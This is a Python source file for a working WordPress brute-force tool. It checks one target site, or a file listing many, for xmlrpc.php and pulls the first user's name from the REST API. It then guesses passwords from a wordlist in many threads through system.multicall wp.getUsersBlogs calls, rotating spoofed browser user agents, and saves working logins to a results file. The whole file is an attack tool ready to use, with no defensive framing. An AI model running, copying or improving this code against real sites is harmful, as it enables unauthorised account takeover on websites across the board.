print("""
 /$$$$$$$          /$$      /$$ /$$$$$$$  /$$$$$$$  /$$$$$$$$
| $$__  $$        | $$  /$ | $$| $$__  $$| $$__  $$| $$_____/
| $$  \ $$        | $$ /$$$| $$| $$  \ $$| $$  \ $$| $$      
| $$$$$$$/ /$$$$$$| $$/$$ $$ $$| $$$$$$$/| $$$$$$$ | $$$$$   
| $$__  $$|______/| $$$$_  $$$$| $$____/ | $$__  $$| $$__/   
| $$  \ $$        | $$$/ \  $$$| $$      | $$  \ $$| $$      
| $$  | $$        | $$/   \  $$| $$      | $$$$$$$/| $$      
|__/  |__/        |__/     \__/|__/      |_______/ |__/      
                                                             
=============================================================
[*] [Rusher WPBF - XMLRPC.php] | [R&D ICWR - Afrizal F.A]
=============================================================
""")

import os, sys, random, requests, concurrent.futures
from argparse import ArgumentParser

class rusher_wpbf:

    def count_percent(self):

        self.percent = self.done_process / self.total_process * 100

    def useragent(self):

        arr = ["Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12 (.NET CLR 3.5.30729)", "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3", "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; ja-jp) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16", "Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0", "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.427.0 Safari/534.1"]
        return arr[random.randint(0, len(arr)-1)]

    def check_xmlrpc(self, target):

        try:

            xmldata = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data></data></array></value></param></params></methodCall>'
            x = requests.post(url="{}/xmlrpc.php".format(target), data=xmldata, headers={ "User-Agent": self.useragent(), "Content-Type": "application/xml" }, timeout=self.args.timeout)

            if '<methodResponse>' in x.text:

                return True

            else:

                return False

        except:

            return False

    def get_user(self, target):

        try:

            x = requests.get(url="{}/wp-json/wp/v2/users/1".format(target), headers={ "User-Agent": self.useragent(), "Content-Type": "application/xml" }, timeout=self.args.timeout)
            return x.json()['name']

        except:

            return "admin"

    def req(self, target, user, passwd):

        try:

            xml = """<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{}</string></value><value><string>{}</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>""".format(user, passwd)
            x = requests.post(url="{}/xmlrpc.php".format(target), headers={ "User-Agent": self.useragent(), "Content-Type": "application/xml" }, data=xml, timeout=self.args.timeout)

            if "<name>isAdmin</name>" in x.text:

                open("result-wp/success.txt", "a").write("{}|{}|{}\n".format(target, user, passwd))
                self.result += 1

            self.done_process += 1
            self.count_percent()            

        except:

            if self.try_login < 3:

                self.try_login += 1
                self.req(target, user, passwd)

            elif self.try_login > 3:

                self.try_login = 0
                self.done_process += 1
                self.count_percent()

        sys.stdout.write("\r[*] [Proccess] [{}/{} | {}%] [Result: {}/{}]".format(self.done_process, self.total_process, round(self.percent), self.result, self.target))
        sys.stdout.flush()

    def execution(self, target, thread):
        
        if self.check_xmlrpc(target):

            user = self.get_user(target)
            self.total_process += len(open(self.args.wordlist).read().splitlines())

            with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:

                for x in open(self.args.wordlist).read().splitlines():

                    executor.submit(self.req, target, user, x)

        else:

            pass

    def __init__(self):

        if not os.path.isdir("result-wp"):

            os.mkdir("result-wp")

        self.done_process = 0
        self.try_login = 0
        self.total_process = 0
        self.result = 0
        parser = ArgumentParser()
        parser.add_argument("-x", "--target", required=True)
        parser.add_argument("-w", "--wordlist", required=True)
        parser.add_argument("-t", "--thread", required=True, type=int)
        parser.add_argument("-d", "--timeout", required=True, type=int)
        self.args = parser.parse_args()
        print("[*] [Thread: {}]".format(self.args.thread))
        print("[*] [Timeout: {}]".format(self.args.timeout))

        if os.path.isfile(self.args.target):

            if os.path.isfile(self.args.wordlist):

                print("[*] [Bruteforcing]")
                self.target = len(open(self.args.target).read().splitlines())

                with concurrent.futures.ThreadPoolExecutor(max_workers=self.args.thread) as executor:

                    for target in open(self.args.target).read().splitlines():

                        executor.submit(self.execution, target, self.args.thread)

            else:

                print("[-] [Error] -> ( Not found {} )".format(self.args.wordlist))

        else:

            if os.path.isfile(self.args.wordlist):

                print("[*] [Bruteforcing]")
                self.target = 1
                self.execution(self.args.target, self.args.thread)

            else:

                print("[-] [Error] -> ( Not found {} )".format(self.args.wordlist))

        print("\n")

        if self.result > 0:

            print("[+] [View Result: result-wp/success.txt]")

            print("\n")

            for x in open("result-wp/success.txt").read().splitlines():

                print("[+] [{}]".format(x))

        else:

            print("[-] [No Result]")

        print("\n")
        print("[*] [Done]")

if __name__ == "__main__":
    
    rusher_wpbf()
